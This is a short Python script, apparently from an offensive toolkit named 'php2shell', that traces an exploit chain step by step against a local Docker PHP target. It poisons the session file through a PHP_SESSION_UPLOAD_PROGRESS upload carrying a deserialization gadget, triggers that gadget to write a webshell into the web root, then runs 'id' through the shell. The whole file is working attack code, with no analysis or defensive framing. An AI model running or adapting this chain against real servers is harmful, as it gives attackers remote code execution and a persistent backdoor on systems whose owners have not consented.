#!/usr/bin/env python3
"""Trace the weapon's exact sessgap flow step by step."""
import subprocess
import sys
import time

sys.path.insert(0, "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons")
from php2shell import (multipart_body, build_gadget_injection, WEBSHELL,
                       raw_post, http_req)

HOST, PORT = "127.0.0.1", 8085
BASE = "http://127.0.0.1:8085"
SID = "w" + "0" * 31

inj = build_gadget_injection("DeferredWriter",
                             {"path": "/var/www/html/p2s_shell.php",
                              "data": WEBSHELL})
print("INJ len", len(inj), ":", inj)

# stage 1: weapon-shaped upload
body = multipart_body([("PHP_SESSION_UPLOAD_PROGRESS", inj), ("PHPSESSID", SID)],
                      [("f", "notes.txt", b"A" * (1024 * 1024))])
code, resp = raw_post(HOST, PORT, "/up.php", {
    "Cookie": f"PHPSESSID={SID}",
    "Content-Type": "multipart/form-data; boundary=P2Sbound2026"}, body)
print("[1] upload:", code)
time.sleep(1)
r = subprocess.run(["docker", "exec", "van85", "cat", f"/tmp/sess_{SID}"],
                   capture_output=True, text=True)
print("[1.5] session file:", r.stdout[:180] or "(MISSING)")

# stage 2: read side
st, rb, rh, dt = http_req(BASE + "/read.php",
                          headers={"Cookie": f"PHPSESSID={SID}"})
print("[2] read:", st, rb[:250])

# stage 3: shell
st, rb, rh, dt = http_req(BASE + "/p2s_shell.php?c=id")
print("[3] shell:", st, rb[:120])
